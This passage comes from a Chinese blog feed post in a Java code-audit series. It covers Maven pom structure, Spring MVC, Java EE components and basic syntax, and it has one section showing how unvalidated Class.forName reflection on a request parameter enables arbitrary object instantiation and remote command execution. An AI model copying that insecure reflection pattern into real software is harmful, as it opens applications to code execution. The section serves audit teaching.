标签：坐标向量之一；代表项目下的某一个模块--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seer-heathy-demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--version 标签：坐标向量之一；代表当前模块的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--packaging 标签：打包方式--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--取值jar：生成jar包，说明这是一个Java工程--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--取值war:生成war包，说明这是一个Web工程--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--取值pom：说明这个工程是用来管理其他工程的工程--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>seer-heathy-demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--在Maven中定义属性值--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--在构建过程中读取源码时使用的字符集--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--dependencies标签：配置具体依赖信息，可以包含多个dependency子标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--dependency 标签：配置一个具体的依赖信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--坐标信息：导入那个jar包，就配置它的坐标信息即可--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--scope标签：配置当前依赖的范围--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><br/><h3 id="五、Spring-Boot"><a href="#五、Spring-Boot" class="headerlink" title="五、Spring Boot"></a>五、Spring Boot</h3><p><code>SpringBoot</code> 是一款基于 <code>JAVA</code> 的开源框架。目的是为了简化 <code>Spring</code> 应用搭建和开发流程。现在绝大多数的新项目都基于 <code>Spring Boot</code> 的 <code>Spring MVC</code> 来实现。</p><h4 id="1、Spring-MVC"><a href="#1、Spring-MVC" class="headerlink" title="1、Spring MVC"></a>1、Spring MVC</h4><p><code>Spring MVC</code> 是 <code>Spring</code> 提供的一个基于 <code>MVC</code> 设计模式的轻量级 <code>Web</code> 开发框架，本质上相当于 <code>Servlet</code>（Servlet 是运行在 <code>Web</code> 服务器或应用服务器上的程序，它是作为来自 <code>Web</code> 浏览器或其他 <code>HTTP</code> 客户端的请求和 <code>HTTP</code> 服务器上的数据库或应用程序之间的中间层。）</p><h4 id="2、接口"><a href="#2、接口" class="headerlink" title="2、接口"></a>2、接口</h4><ul><li><code>DispatcherServlet 接口</code>：前端控制器，所有请求都经过它来统一分发，DispatcherServlet将请求分发给Spring Controller之前，需要借助于Spring提供的HandlerMapping定位到具体的 Controller。</li><li><code>HandlerMapping 接口</code>：完成客户请求到 Controller 的映射。</li><li><code>Controller接口</code>：并发用户处理 DispatcherServlet、HandlerMapping 请求，因此实现Controller接口时，必须保证线程安全并且可重用。</li></ul><h4 id="3、DispatcherServlet"><a href="#3、DispatcherServlet" class="headerlink" title="3、DispatcherServlet"></a>3、DispatcherServlet</h4><p>是整个Spring MVC的核心。主要负责截获请求并将其分派给相应的处理器处理。其主要工作有以下三项：</p><ul><li>截获符合特定格式的URL请求</li><li>初始化 DispatcherServlet 上下文对应 WebApplicationContext ，并将其与业务层、持久化层的 WebApplicationContext 建立关联。</li><li>初始化 Spring MVC 的各个组成组件，并装配到 DispatcherServlet 中。</li></ul><br/><h3 id="六、Java-反射机制"><a href="#六、Java-反射机制" class="headerlink" title="六、Java 反射机制"></a>六、Java 反射机制</h3><p>Java 反射机制可以无视类方法、变量去访问权限修饰符（如 protected、private等），并且可以调用任何类的任意方法、访问并修改成员变量值。即当我们在能控制反射的类名、方法名、参数的前提下，发现了一处 Java 反射调用的漏洞，我们就可以任意构造攻击。</p><p>1、什么是反射<br>反射使 Java 代码能够发现有关已加载类的字段、方法和构造函数的信息，并在安全限制内使用反射的字段、方法和构造函数对底层对应的对象进行操作。即通过反射我们可以在运行时获得程序或程序集中每一个类型的成员和成员信息。在运行状态中通过反射机制，我们能判断一个对象所属的类，了解任意一个类的所有属性和方法，能够调用任意一个对象的任意方法和属性。</p><p>2、不安全的反射机制<br>Java 的反射机制可以无视类方法、变量访问权限修饰符，可以调用任何类的任意方法、访问并修改成员变量值，那么这可能导致安全问题，如果一个攻击者能够通过应用程序创建意外的控制流路径，那么就有可能绕过安全检查发起相关攻击。假设有段代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> <span class="keyword">if</span> (name.equals(<span class="string">&quot;Delect&quot;</span>)) &#123;</span><br><span class="line">   command = <span class="keyword">new</span> <span class="title class_">DelectCommand</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl.equals(<span class="string">&quot;Add&quot;</span>)) &#123;</span><br><span class="line">   command = <span class="keyword">new</span> <span class="title class_">AddCommand</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line">command.doAction(request);</span><br></pre></td></tr></table></figure></div><p>存在一个字段为 name，当获取用户请求的 name 字段后进行判断，如果请求的是 Delect 操作，则执行DelectCommand 函数，若执行的是 Add 操作，则执行 AddCommand 函数，如果不是这两种操作，则执行其他代码。<br>此时，假如有位开发者看到了这段代码，他觉得可以使用Java 的反射来重构此代码以减少代码行，如下所示：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">  <span class="type">Class</span> <span class="variable">ComandClass</span> <span class="operator">=</span> Class.forName(name + <span class="string">&quot;Command&quot;</span>);</span><br><span class="line">  <span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> (Command) CommandClass.newInstance();</span><br><span class="line">  command.doAction(request);</span><br></pre></td></tr></table></figure></div><p>这样的重构看起来使得代码行减少，消除了 if&#x2F;else 块，而且可以在不修改命令分派器的情况下添加新的命令类型，但是如果没有对传入进来的 name 字段进行限制，那么我们就能实例化实现 Command 接口的任何对象，从而导致安全问题。实际上，攻击者甚至不局限于本例中的 Command 接口对象，而是使用任何其他对象来实现，如调用系统中任何对象的默认构造函数，再如调用 Runtime 对象去执行系统命令，这就可能导致远程命令执行漏洞，因此不安全的反射的危害性极大，也是我们审计过程中重点关注的内容。</p><br/><h3 id="七、Java-EE-核心技术"><a href="#七、Java-EE-核心技术" class="headerlink" title="七、Java EE 核心技术"></a>七、Java EE 核心技术</h3><ul><li>JDBC：Java 数据库链接，提供了客户端访问数据库应用的程序接口以及查询和更新数据库中数据的方法。</li><li>JNDI：Java 命名和目录接口，是 JAVA 的一个目录服务应用程序界面，提供了一个目录系统，并将服务名称与对象关联起来，使开发者在开发过程中可以用名称来访问对象。</li><li>RMI：远程调用方法，为 Java 的一组拥护开发分布式应用程序的 API，增强了Java 开发分布式应用的能力。</li><li>Servlet：Java Web 容器中运行的程序，通常用来处理较为复杂的服务端业务逻辑。使用 Java 编写而成的服务器程序，狭义的 Servlet 为 Java 语言实现的一个接口，广义的说就是任何实现该 Servlet 接口的类，主要功能在于交互式地浏览和修改数据，生成动态的 web 内容。</li></ul><br/><h3 id="八、Java-基础语法"><a href="#八、Java-基础语法" class="headerlink" title="八、Java 基础语法"></a>八、Java 基础语法</h3><h4 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h4><p>Java 是一个解释型的语言，可跨平台执行。一个 Java 程序可以认为是一系列对象的集合，这些对象通过调用彼此的方法来协同工作，每个 Java 文件都是一个类，同一文件夹下可以互相调用其他文件下的类，不同文件夹下可以通过 import 命令进行导入。其中 Java 中的包其实就是文件夹，在同一个包中可以理解成同一文件夹下。</p><h4 id="2、语法注意点"><a href="#2、语法注意点" class="headerlink" title="2、语法注意点"></a>2、语法注意点</h4><table><thead><tr><th>注意点</th><th>简述</th></tr></thead><tbody><tr><td>大小写敏感</td><td>Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的</td></tr><tr><td>类名</td><td>对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong></td></tr><tr><td>方法名</td><td>所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写</td></tr><tr><td>源文件名</td><td>源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）</td></tr><tr><td>主方法入口</td><td>所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行</td></tr></tbody></table><br/><h4 id="3、简单实例"><a href="#3、简单实例" class="headerlink" title="3、简单实例"></a>3、简单实例</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="comment">/* 第一个Java程序</span></span><br><span class="line"><span class="comment">     * 它将输出字符串 Hello World</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>); <span class="comment">// 输出 Hello World</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/base/662E827A-FA32-4464-B0BD-40087F429E98.jpg" data-caption="image-20220924211209757"><img src="/../images/Java/base/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="image-20220924211209757"></a></p><br/><h4 id="4、构造函数"><a href="#4、构造函数" class="headerlink" title="4、构造函数"></a>4、构造函数</h4><p>一个类可以包含以下类型变量：</p><ul><li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li><li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li><li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li></ul><p>一个类可以有多个构造函数，根据对象的创建情况触发不同的构造函数，若在创建对象的时候传入了参数，则会触发第二个构造函数，如果不传入参数则会触发第一个构造函数，例子如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;cody&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Other class named test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo1</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The first Construct def.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo1</span><span class="params">(String a)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The second Construct def,string is &quot;</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">demo1</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>(<span class="string">&quot;SFL&quot;</span>);</span><br><span class="line">        <span class="type">demo1</span> <span class="variable">test2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">        <span class="type">test</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">        System.out.println(te.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行结果如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/base/image-20221009145926209.png" data-caption="image-20221009145926209"><img src="/../images/Java/base/image-20221009145926209.png" alt="image-20221009145926209"></a></p><br/><h4 id="5、类与对象"><a href="#5、类与对象" class="headerlink" title="5、类与对象"></a>5、类与对象</h4><p>假设有一个类名为Test，创建对象abc，语法如下</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类名称 对象名 = new 类名称();</span></span><br><span class="line"><span class="type">test</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br></pre></td></tr></table></figure></div><p>类：类是一个模板，它描述一类对象的行为和状态。例子如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    String breed;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    String colour;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">name</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>对象：对象是类的一个实例。例子如下:</p><ul><li><strong>声明</strong>：声明一个对象，包括对象名称和对象类型。</li><li><strong>实例化</strong>：使用关键字 new 来创建一个对象。</li><li><strong>初始化</strong>：使用 new 创建对象时，会调用构造方法初始化对象。</li></ul><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Puppy</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Puppy</span><span class="params">(String name)</span>&#123;</span><br><span class="line">      <span class="comment">//这个构造器仅有一个参数：name</span></span><br><span class="line">      System.out.println(<span class="string">&quot;小狗的名字是 : &quot;</span> + name ); </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="comment">// 下面的语句将创建一个Puppy对象</span></span><br><span class="line">      <span class="type">Puppy</span> <span class="variable">myPuppy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Puppy</span>( <span class="string">&quot;tommy&quot;</span> );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="6、变量与常量"><a href="#6、变量与常量" class="headerlink" title="6、变量与常量"></a>6、变量与常量</h4><p>例子如下，a为变量，b在char前加了 final 为常量，常量无法被更改。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char a = &#x27;a&#x27;;</span><br><span class="line">final char b = &#x27;b&#x27;;</span><br></pre></td></tr></table></figure></div><br/><h4 id="7、访问实例变量和方法"><a href="#7、访问实例变量和方法" class="headerlink" title="7、访问实例变量和方法"></a>7、访问实例变量和方法</h4><p>通过已创建的对象来访问成员变量和成员方法，如下所示：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实例化对象：Object referenceVariable = new Constructor();</span><br><span class="line">访问类中的变量：referenceVariable.variableName;</span><br><span class="line">访问类中的方法：referenceVariable.methodName();</span><br></pre></td></tr></table></figure></div><p>实例,下面的例子展示如何访问实例变量和调用成员方法：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Puppy</span>&#123;</span><br><span class="line">   <span class="type">int</span> puppyAge;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Puppy</span><span class="params">(String name)</span>&#123;</span><br><span class="line">      <span class="comment">// 这个构造器仅有一个参数：name</span></span><br><span class="line">      System.out.println(<span class="string">&quot;小狗的名字是 : &quot;</span> + name ); </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">( <span class="type">int</span> age )</span>&#123;</span><br><span class="line">       puppyAge = age;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">( )</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;小狗的年龄为 : &quot;</span> + puppyAge ); </span><br><span class="line">       <span class="keyword">return</span> puppyAge;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="comment">/* 创建对象为myPuppy */</span></span><br><span class="line">      <span class="type">Puppy</span> <span class="variable">myPuppy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Puppy</span>( <span class="string">&quot;tommy&quot;</span> );</span><br><span class="line">      <span class="comment">/* 利用创建的对象，通过方法来设定age */</span></span><br><span class="line">      myPuppy.setAge( <span class="number">2</span> );</span><br><span class="line">      <span class="comment">/* 调用另一个方法获取age */</span></span><br><span class="line">      myPuppy.getAge( );</span><br><span class="line">      <span class="comment">/*你也可以像下面这样访问成员变量 */</span></span><br><span class="line">      System.out.println(<span class="string">&quot;变量值 : &quot;</span> + myPuppy.puppyAge ); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行结果如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/base/image-20221009150647117.png" data-caption="image-20221009150647117"><img src="/../images/Java/base/image-20221009150647117.png" alt="image-20221009150647117"></a></p><br/><h4 id="8、接口"><a href="#8、接口" class="headerlink" title="8、接口"></a>8、接口</h4><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p><p>接口的声明语法格式如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[可见度] interface 接口名称 [extends 其他的接口名] &#123;</span><br><span class="line">        <span class="comment">// 声明变量</span></span><br><span class="line">        <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Interface关键字用来声明一个接口。下面是接口声明的一个简单例子。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : NameOfInterface.java */</span></span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="comment">//引入包</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">NameOfInterface</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//任何类型 final, static 字段</span></span><br><span class="line">   <span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>实例,Animal.java 文件代码：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : Animal.java */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>接口的实现,当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。类使用implements关键字实现接口。在类声明中，Implements关键字放在class声明后面。实例</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : MammalInt.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MammalInt</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal eats&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal travels&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">noOfLegs</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">MammalInt</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MammalInt</span>();</span><br><span class="line">      m.eat();</span><br><span class="line">      m.travel();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以上实例编译运行结果如下:</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mammal eats</span><br><span class="line">Mammal travels</span><br></pre></td></tr></table></figure></div><br/><h3 id="九、参考文章"><a href="#九、参考文章" class="headerlink" title="九、参考文章"></a>九、参考文章</h3><p><code>https://blog.csdn.net/chehec2010/article/details/123997607</code><br><code>https://blog.csdn.net/jianyuerensheng/article/details/51258942</code><br><code>https://www.freebuf.com/vuls/344685.html</code><br><code>https://www.cnpanda.net/codeaudit/705.html</code><br><code>https://blog.csdn.net/qq_41874930/article/details/115614958</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(二)-远程代码执行</title>
      <link href="/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
